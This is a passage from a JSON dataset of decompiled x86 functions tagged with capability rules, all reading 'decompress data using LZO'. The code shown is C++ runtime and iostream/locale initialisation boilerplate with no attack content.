*0x4f5e8c = 0;\n    *0x4f5e90 = 0;\n    *0x4f5e94 = 0;\n    *0x4f5e98 = 0;\n    *0x4f5e9c = 0;\n    *0x4f5ea0 = 0;\n    *0x4f5ea4 = 0;\n    *0x4f5ea8 = 0;\n    *0x4f5eac = 0;\n    *0x4f5eb0 = 0;\n    *0x4f5eb4 = 0;\n    *0x4f5eb8 = 0;\n    *0x4f5ebc = 0;\n    *0x4f5ec0 = 0;\n    *0x4f5ec4 = 0;\n    *0x4f5ec8 = 0;\n    *0x4f5ecc = 0;\n    *0x4f5ed0 = 0;\n    *0x4f5ed4 = 0;\n    *0x4f5ed8 = 0;\n    *0x4f5edc = 0;\n    *0x4f5ee0 = 0;\n    *0x4f5ee4 = 0;\n    *0x4f5ee8 = 0;\n    *0x4f5eec = 0;\n    *0x4f5ef0 = 0;\n    *0x4f5ef4 = 0;\n    *0x4f5ef8 = 0;\n    *0x4f5efc = 0;\n    *0x4f5f00 = 0;\n    *0x4f5f04 = 0;\n    fcn.0046f3d0(0x4f5e40, 1);\n    fcn.0048dc70(0x4f6d7c, 0x4f5c68);\n    *0x4f5c1c = 1;\n    *0x4f5c18 = 0x50a608;\n    fcn.0048dc70(0x4f6f10, 0x4f5c18);\n    *0x4f5c2c = 1;\n    *0x4f5c28 = 0x50b574;\n    fcn.0048dc70(0x4f6f70, 0x4f5c28);\n    fcn.00498b60(1);\n    fcn.0048dc70(0x4f6f00, 0x4f5be0);\n    fcn.0048cb60(1);\n    fcn.0048dc70(0x4f6ec4, 0x4f63c0);\n    fcn.00499930(1);\n    fcn.0048dc70(0x4f6f34, 0x4f678c);\n    *0x4f5d84 = 1;\n    *0x4f5d80 = 0x50ae00;\n    *0x4f5d88 = 0;\n    *0x4f5d8c = 0;\n    *0x4f5d90 = 0;\n    *0x4f5d94 = 0;\n    *0x4f5d98 = 0;\n    *0x4f5d9c = 0;\n    *0x4f5da0 = 0;\n    *0x4f5da4 = 0;\n    *0x4f5e24 = 0;\n    *0x4f5c10 = 1;\n    *0x4f5c0c = 0x50a5e4;\n    *0x4f5c14 = 0x4f5d80;\n    fcn.00499190(0);\n    fcn.0048dc70(0x4f6f0c, 0x4f5c0c);\n    *0x4f688c = 1;\n    *0x4f6888 = 0x50b3e4;\n    fcn.0048dc70(0x4f6f44, 0x4f6888);\n    *0x4f689c = 1;\n    *0x4f6898 = 0x50b450;\n    fcn.0048dc70(0x4f6f4c, 0x4f6898);\n    *0x4f67a8 = 1;\n    *0x4f67a4 = 0x50a56c;\n    *0x4f67ac = fcn.0048f260();\n    fcn.0048dc70(0x4f6efc, 0x4f67a4);\n    *0x4f60c4 = 1;\n    *0x4f60c0 = 0x50af34;\n    *0x4f60c8 = 0;\n    *0x4f60cc = 0;\n    *0x4f60d0 = 0;\n    *0x4f60d2 = 0;\n    *0x4f60d8 = 0;\n    *0x4f60dc = 0;\n    *0x4f60e0 = 0;\n    *0x4f60e4 = 0;\n    *0x4f60e8 = 0;\n    *0x4f60ec = 0;\n    *0x4f60f0 = 0;\n    *0x4f60f4 = 0;\n    *0x4f60f8 = 0;\n    *0x4f6112 = 0;\n    *0x4f5cc4 = 1;\n    *0x4f5cc0 = 0x50a308;\n    *0x4f5cc8 = 0x4f60c0;\n    fcn.0048fec0(0, 0);\n    fcn.0048dc70(0x4f6ef0, 0x4f5cc0);\n    *0x4f6124 = 1;\n    *0x4f6120 = 0x50af44;\n    *0x4f6128 = 0;\n    *0x4f612c = 0;\n    *0x4f6130 = 0;\n    *0x4f6132 = 0;\n    *0x4f6138 = 0;\n    *0x4f613c = 0;\n    *0x4f6140 = 0;\n    *0x4f6144 = 0;\n    *0x4f6148 = 0;\n    *0x4f614c = 0;\n    *0x4f6150 = 0;\n    *0x4f6154 = 0;\n    *0x4f6158 = 0;\n    *0x4f6172 = 0;\n    *0x4f5cd0 = 1;\n    *0x4f5ccc = 0x50a33c;\n    *0x4f5cd4 = 0x4f6120;\n    fcn.004902b0(0, 0);\n    fcn.0048dc70(0x4f6ef4, 0x4f5ccc);\n    *0x4f5c54 = 1;\n    *0x4f5c50 = 0x50a678;\n    fcn.0048dc70(0x4f6f1c, 0x4f5c50);\n    *0x4f5c64 = 1;\n    *0x4f5c60 = 0x50a6a8;\n    fcn.0048dc70(0x4f6f24, 0x4f5c60);\n    *0x4f5f24 = 1;\n    *0x4f5f20 = 0x50ae34;\n    *0x4f5f28 = 0;\n    *0x4f5f2c = 0;\n    *0x4f5f30 = 0;\n    *0x4f5f34 = 0;\n    *0x4f5f38 = 0;\n    *0x4f5f3c = 0;\n    *0x4f5f40 = 0;\n    *0x4f5f44 = 0;\n    *0x4f5f48 = 0;\n    *0x4f5f4c = 0;\n    *0x4f5f50 = 0;\n    *0x4f5f54 = 0;\n    *0x4f5f58 = 0;\n    *0x4f5f5c = 0;\n    *0x4f5f60 = 0;\n    *0x4f5f64 = 0;\n    *0x4f5f68 = 0;\n    *0x4f5f6c = 0;\n    *0x4f5f70 = 0;\n    *0x4f5f74 = 0;\n    *0x4f5f78 = 0;\n    *0x4f5f7c = 0;\n    *0x4f5f80 = 0;\n    *0x4f5f84 = 0;\n    *0x4f5f88 = 0;\n    *0x4f5f8c = 0;\n    *0x4f5f90 = 0;\n    *0x4f5f94 = 0;\n    *0x4f5f98 = 0;\n    *0x4f5f9c = 0;\n    *0x4f5fa0 = 0;\n    *0x4f5fa4 = 0;\n    *0x4f5fa8 = 0;\n    *0x4f5fac = 0;\n    *0x4f5fb0 = 0;\n    *0x4f5fb4 = 0;\n    *0x4f5fb8 = 0;\n    *0x4f5fbc = 0;\n    *0x4f5fc0 = 0;\n    *0x4f5fc4 = 0;\n    *0x4f5fc8 = 0;\n    *0x4f5fcc = 0;\n    *0x4f5fd0 = 0;\n    *0x4f5fd4 = 0;\n    *0x4f5fd8 = 0;\n    *0x4f5fdc = 0;\n    *0x4f5fe0 = 0;\n    *0x4f5fe4 = 0;\n    fcn.0046fb10(0x4f5f20, 1);\n    fcn.0048dc70(0x4f6d80, 0x4f5c7c);\n    *0x4f5c24 = 1;\n    *0x4f5c20 = 0x50a634;\n    fcn.0048dc70(0x4f6f14, 0x4f5c20);\n    *0x4f5c34 = 1;\n    *0x4f5c30 = 0x50b588;\n    fcn.0048dc70(0x4f6f74, 0x4f5c30);\n    fcn.00498cf0(1);\n    fcn.0048dc70(0x4f6f04, 0x4f5bf0);\n    *0x4f5c3c = 1;\n    *0x4f5c38 = vtable.:F.0;\n    fcn.0048dc70(0x4f6f2c, 0x4f5c38);\n    *0x4f5c44 = 1;\n    *0x4f5c40 = 0x50b2c0;\n    fcn.0048dc70(0x4f6f28, 0x4f5c40);\n    var_20h = 0x4f5d00;\n    var_1ch = 0x4f6000;\n    var_18h = 0x4f6060;\n    var_14h = 0x4f5d80;\n    var_10h = 0x4f60c0;\n    var_ch = 0x4f6120;\n    fcn.0048ccf0(&var_20h);\n    iVar5 = in_ECX[3];\n    iVar3 = fcn.00432500();\n    *(iVar5 + iVar3 * 4) = 0x4f5d00;\n    iVar5 = in_ECX[3];\n    iVar3 = fcn.00432500();\n    *(iVar5 + iVar3 * 4) = 0x4f6000;\n    iVar5 = in_ECX[3];\n    iVar3 = fcn.00432500();\n    *(iVar5 + iVar3 * 4) = 0x4f6060;\n    iVar5 = in_ECX[3];\n    iVar3 = fcn.00432500();\n    *(iVar5 + iVar3 * 4) = 0x4f5e40;\n    iVar5 = in_ECX[3];\n    iVar3 = fcn.00432500();\n    *(iVar5 + iVar3 * 4) = 0x4f5d80;\n    iVar5 = in_ECX[3];\n    iVar3 = fcn.00432500();\n    *(iVar5 + iVar3 * 4) = 0x4f60c0;\n    iVar5 = in_ECX[3];\n    iVar4 = fcn.00432500();\n    iVar3 = in_ECX[3];\n    *(iVar5 + iVar4 * 4) = 0x4f6120;\n    iVar5 = fcn.00432500();\n    *(iVar3 + iVar5 * 4) = 0x4f5f20;\n    return;\n}\n",
        "token_count": 5045
    },
    "0048f390": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0048f390(uint arg_8h, int32_t **arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    code *unaff_EBX;\n    uint uVar5;\n    ulong uVar6;\n    uchar auStack65 [9];\n    uint var_34h;\n    uint *var_30h;\n    uint var_28h;\n    uint uStack32;\n    code *var_ch;\n    \n    var_ch = unaff_EBX;\n    fcn.0048cc10();\n    var_34h = fcn.00428bc0();\n    if (*0x4f59f4 == 0) {\n        piVar1 = *arg_ch;\n    }\n    else {\n        iVar2 = fcn.00418d60(var_34h);\n        if (iVar2 != 0) {\n            uVar4 = fcn.0042a720();\n            fcn.00429000();\n            uVar5 = uVar4;\n            do {\n                uVar6 = fcn.0041b360(uVar5);\n                uVar5 = uVar6;\n            } while (uVar6 >> 0x20 != -1);\n            fcn.004a37a0();\n            fcn.0048f380();\n            fcn.0041b360(arg_8h);\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(arg_8h);\n            fcn.0048f380();\n            fcn.0041b360(arg_8h);\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(arg_8h);\n            fcn.0048f380();\n            fcn.0041b360(arg_8h);\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(arg_8h);\n            fcn.0048f380();\n            fcn.0041b360(arg_8h);\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(arg_8h);\n            fcn.0048f380();\n            fcn.0041b360(arg_8h);\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(arg_8h);\n            fcn.0048f380();\n            fcn.0041b360(arg_8h);\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(arg_8h);\n            fcn.0048f380();\n            fcn.0041b360(arg_8h);\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(arg_8h);\n            fcn.0048f380();\n            fcn.0041b360(arg_8h);\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(arg_8h);\n            fcn.0048f380();\n            fcn.0041b360(arg_8h);\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(arg_8h);\n            fcn.0048f380();\n            fcn.0041b360(arg_8h);\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(arg_8h);\n            fcn.0048f380();\n            fcn.0041b360(arg_8h);\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(arg_8h);\n            fcn.0048f380();\n            fcn.0041b360(arg_8h);\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(arg_8h);\n            fcn.0048f380();\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(uVar4);\n            fcn.004a34c0();\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(uVar4);\n            fcn.004a34c0();\n            fcn.0041b360(uVar4);\n            fcn.0046bf80(&uStack32 + 3);\n            fcn.0041b360(arg_8h);\n            if (uStack32 != NULL) {\n                (*uStack32)(arg_8h);\n            }\n            fcn.0041b360(uVar4);\n            if (uStack32 != NULL) {\n                (*uStack32)(arg_8h);\n            }\n            fcn.0041b360(uVar4);\n            if (var_ch != NULL) {\n                (*var_ch)(arg_8h);\n            }\n            fcn.0041b360(uVar4);\n            if (var_ch != NULL) {\n                (*var_ch)(arg_8h);\n            }\n            fcn.0041b360(uVar4);\n            if (var_ch != NULL) {\n                (*var_ch)(arg_8h);\n            }\n            fcn.0041b360(uVar4);\n            if (var_ch != NULL) {\n                (*var_ch)(arg_8h);\n            }\n            fcn.0041b360(uVar4);\n            fcn.0046bf80(auStack65);\n            if (uStack32 != NULL) {\n                (*uStack32)(uVar4);\n            }\n            fcn.0041b360(arg_8h);\n            fcn.004640c0(auStack65);\n            if (uStack32 != NULL) {\n                (*uStack32)();\n            }\n            fcn.0041b360(uVar4);\n            fcn.0048f380();\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(arg_8h);\n            fcn.0048f380();\n            fcn.004a34c0(uVar4);\n            fcn.0041b360(arg_8h);\n            fcn.0048f380();\n            do {\n                fcn.004a34c0(uVar4);\n                fcn.0041b360(arg_8h);\n                fcn.004a34c0(uVar4);\n                fcn.0041b360(arg_8h);\n                fcn.00433e60();\n                fcn.0046e880();\n            } while( true );\n        }\n        piVar1 = *arg_ch;\n        if (*0x4f59f4 != 0) {\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n            piVar1 = *arg_ch;\n            uVar5 = *0x4f6ee4;\n            goto code_r0x0048f3c1;\n        }\n    }\n    *piVar1 = *piVar1 + 1;\n    uVar5 = *0x4f6ee4;\ncode_r0x0048f3c1:\n    *0x4f6ee4 = piVar1;\n    fcn.00432540(arg_ch);\n    iVar2 = fcn.004359f0(0x502086);\n    if (iVar2 != 0) goto code_r0x0048f490;\n    while( true ) {\n        if (var_30h != &var_28h) {\n            fcn.004a34c0(var_30h);\n        }\n        if (*0x4f59f4 == 0) break;\n        iVar2 = fcn.00418dc0(var_34h);\n        if (iVar2 == 0) break;\n        puVar3 = fcn.004a3610(4);\n        *puVar3 = 0x509ddc;\n        fcn.004a3bc0(puVar3, 0x506a54, 0x42a520);\ncode_r0x0048f490:\n        sub.msvcrt.dll_setlocale(0, var_30h);\n    }\n    fcn.0048f4f0(uVar5);\n    return arg_8h;\n}\n",
        "token_count": 2123
    },
    "00490ec0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00490ec0(void)\n\n{\n    fcn.004924e0(0);\n    return;\n}\n",
        "token_count": 27
    },
    "00493c30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00493c30(void)\n\n{\n    fcn.00495350(0);\n    return;\n}\n",
        "token_count": 26
    },
    "00496fe0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00496fe0(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x50a5c0;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.00498e40();\n    *in_ECX = 0x50a3e0;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x502609;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = 0x50260b;\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.0048f2e0();\n            fcn.00498e40();\n            fcn.0048f350(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 586
    },
    "004971b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004971b0(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x50a5c0;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.00498e40();\n    *in_ECX = 0x50a3e0;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x502609;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = 0x50260b;\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.0048f2e0();\n            fcn.00498e40();\n            fcn.0048f350(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 586
    },
    "004973c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004973c0(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x50a5e4;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.00499190();\n    *in_ECX = 0x50a404;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x5028c5;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = 0x5028c7;\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.0048f2e0();\n            fcn.00499190();\n            fcn.0048f350(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 585
    },
    "00497590": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00497590(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x50a5e4;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.00499190();\n    *in_ECX = 0x50a404;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x5028c5;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = 0x5028c7;\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.0048f2e0();\n            fcn.00499190();\n            fcn.0048f350(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 584
    },
    "0049a080": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nchar __cdecl fcn.0049a080(uint arg_8h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    uint var_8h;\n    \n    cVar2 = *0x4f6f54;\n    if ((arg_8h != '\\x01') && (*0x4f6f54 != '\\0')) {\n        fcn.0049a3c0();\n        *0x4f6f54 = 0;\n        *0x4f6940 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n        fcn.0048f620();\n        *0x4f68c0 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n        fcn.0048f620();\n        *0x4f6900 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n        fcn.0048f620();\n        *0x4f6a00 = vtable.ages_bynameIcE.0;\n        fcn.0048f620();\n        *0x4f6980 = vtable.ages_bynameIcE.0;\n        fcn.0048f620();\n        *0x4f69c0 = vtable.ages_bynameIcE.0;\n        fcn.0048f620();\n        pcVar1 = *0x4f5a60;\n        uVar3 = (**0x4f5a60)(1);\n        fcn.004290a0(uVar3, 0x10, 0x200);\n        uVar3 = (*pcVar1)(0);\n        fcn.004290a0(uVar3, 8, 0x200);\n        uVar3 = (*pcVar1)(2);\n        fcn.004290a0(uVar3, 0x10, 0x200);\n        fcn.0049c6f0(0x4f6b40);\n        fcn.0049c6f0(0x4f6a40);\n        fcn.0049c6f0(0x4f6ac0);\n        fcn.0049c6f0(0x4f6ac0);\n        uVar3 = (*pcVar1)(1);\n        fcn.00429430(uVar3, 0x10, 0x200);\n        uVar3 = (*pcVar1)(0);\n        fcn.00429430(uVar3, 8, 0x200);\n        uVar3 = (*pcVar1)(2);\n        fcn.00429430(uVar3, 0x10, 0x200);\n        fcn.0049cf10(0x4f6cc0);\n        fcn.0049cf10(0x4f6bc0);\n        fcn.0049cf10(0x4f6c40);\n        fcn.0049cf10(0x4f6c40);\n        fcn.0049ab00();\n        return cVar2;\n    }\n    return *0x4f6f54;\n}\n",
        "token_count": 711
    },
    "0049a3c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.0049a3c0(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint var_8h;\n    \n    pcVar1 = *0x4f5a60;\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    if (*0x4f6f50 == 0) {\n        *0x4f6f50 = 1;\n        *0x4f6f54 = 1;\n        uVar2 = (**0x4f5a60)(1);\n        *0x4f6940 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n        *0x4f6944 = 0;\n        *0x4f6948 = 0;\n        *0x4f694c = 0;\n        *0x4f6950 = 0;\n        *0x4f6954 = 0;\n        *0x4f6958 = 0;\n        fcn.0048f530();\n        *0x4f6940 = 0x509d34;\n        *0x4f6964 = 0xffffffff;\n        *0x4f6960 = uVar2;\n        uVar2 = (*pcVar1)(0);\n        *0x4f68c0 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n        *0x4f68c4 = 0;\n        *0x4f68c8 = 0;\n        *0x4f68cc = 0;\n        *0x4f68d0 = 0;\n        *0x4f68d4 = 0;\n        *0x4f68d8 = 0;\n        fcn.0048f530();\n        *0x4f68c0 = 0x509d34;\n        *0x4f68e4 = 0xffffffff;\n        *0x4f68e0 = uVar2;\n        uVar2 = (*pcVar1)(2);\n        *0x4f6900 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n        *0x4f6904 = 0;\n        *0x4f6908 = 0;\n        *0x4f690c = 0;\n        *0x4f6910 = 0;\n        *0x4f6914 = 0;\n        *0x4f6918 = 0;\n        fcn.0048f530();\n        *0x4f6900 = 0x509d34;\n        *0x4f6924 = 0xffffffff;\n        *0x4f6920 = uVar2;\n        fcn.0049b670();\n        *0x4f71f4 = 0;\n        *0x4f71f8 = 0;\n        *0x4f71fc = 0;\n        *0x4f7200 = 0;\n        *0x4f7204 = 0;\n        *0x4f7208 = 0;\n        *0x4f7180 = 0x50a750;\n        *0x4f7184 = 0x50a764;\n        fcn.0049c4a0(0x4f6940);\n        fcn.0049b670();\n        *0x4f7018 = 0;\n        *0x4f701c = 0;\n        *0x4f7020 = 0;\n        *0x4f7024 = 0;\n        *0x4f7028 = 0;\n        *0x4f702c = 0;\n        *0x4f6fa0 = 0x50a728;\n        *0x4f6fa8 = 0x50a73c;\n        *0x4f6fa4 = 0;\n        fcn.0049c4a0(0x4f68c0);\n        fcn.0049b670();\n        *0x4f70b4 = 0;\n        *0x4f70b8 = 0;\n        *0x4f70bc = 0;\n        *0x4f70c0 = 0;\n        *0x4f70c4 = 0;\n        *0x4f70c8 = 0;\n        *0x4f7040 = 0x50a750;\n        *0x4f7044 = 0x50a764;\n        fcn.0049c4a0(0x4f6900);\n        fcn.0049b670();\n        *0x4f7154 = 0;\n        *0x4f7158 = 0;\n        *0x4f715c = 0;\n        *0x4f7160 = 0;\n        *0x4f7164 = 0;\n        *0x4f7168 = 0;\n        *0x4f70e0 = 0x50a750;\n        *0x4f70e4 = 0x50a764;\n        fcn.0049c4a0(0x4f6900);\n        *0x4f7018 = 0x4f7180;\n        *0x4f7050 = *0x4f7050 | 0x2000;\n        *0x4f70b4 = 0x4f7180;\n        uVar2 = (*pcVar1)(1);\n        *0x4f6a00 = vtable.ages_bynameIcE.0;\n        *0x4f6a04 = 0;\n        *0x4f6a08 = 0;\n        *0x4f6a0c = 0;\n        *0x4f6a10 = 0;\n        *0x4f6a14 = 0;\n        *0x4f6a18 = 0;\n        fcn.0048f530();\n        *0x4f6a24 = 0xffff;\n        *0x4f6a00 = 0x509d74;\n        *0x4f6a20 = uVar2;\n        uVar2 = (*pcVar1)(0);\n        *0x4f6980 = vtable.ages_bynameIcE.0;\n        *0x4f6984 = 0;\n        *0x4f6988 = 0;\n        *0x4f698c = 0;\n        *0x4f6990 = 0;\n        *0x4f6994 = 0;\n        *0x4f6998 = 0;\n        fcn.0048f530();\n        *0x4f6980 = 0x509d74;\n        *0x4f69a4 = 0xffff;\n        *0x4f69a0 = uVar2;\n        uVar2 = (*pcVar1)(2);\n        *0x4f69c0 = vtable.ages_bynameIcE.0;\n        *0x4f69c4 = 0;\n        *0x4f69c8 = 0;\n        *0x4f69cc = 0;\n        *0x4f69d0 = 0;\n        *0x4f69d4 = 0;\n        *0x4f69d8 = 0;\n        fcn.0048f530();\n        *0x4f69c0 = 0x509d74;\n        *0x4f69e4 = 0xffff;\n        *0x4f69e0 = uVar2;\n        fcn.0049b670();\n        *0x4f7474 = 0;\n        *0x4f7478 = 0;\n        *0x4f747a = 0;\n        *0x4f747c = 0;\n        *0x4f7480 = 0;\n        *0x4f7484 = 0;\n        *0x4f7488 = 0;\n        *0x4f7400 = 0x50aaac;\n        *0x4f7404 = 0x50aac0;\n        fcn.0049cca0(0x4f6a00);\n        fcn.0049b670();\n        *0x4f7298 = 0;\n        *0x4f729c = 0;\n        *0x4f729e = 0;\n        *0x4f72a0 = 0;\n        *0x4f72a4 = 0;\n        *0x4f72a8 = 0;\n        *0x4f72ac = 0;\n        *0x4f7220 = 0x50aa84;\n        *0x4f7228 = 0x50aa98;\n        *0x4f7224 = 0;\n        fcn.0049cca0(0x4f6980);\n        fcn.0049b670();\n        *0x4f7338 = 0;\n        *0x4f7334 = 0;\n        *0x4f733a 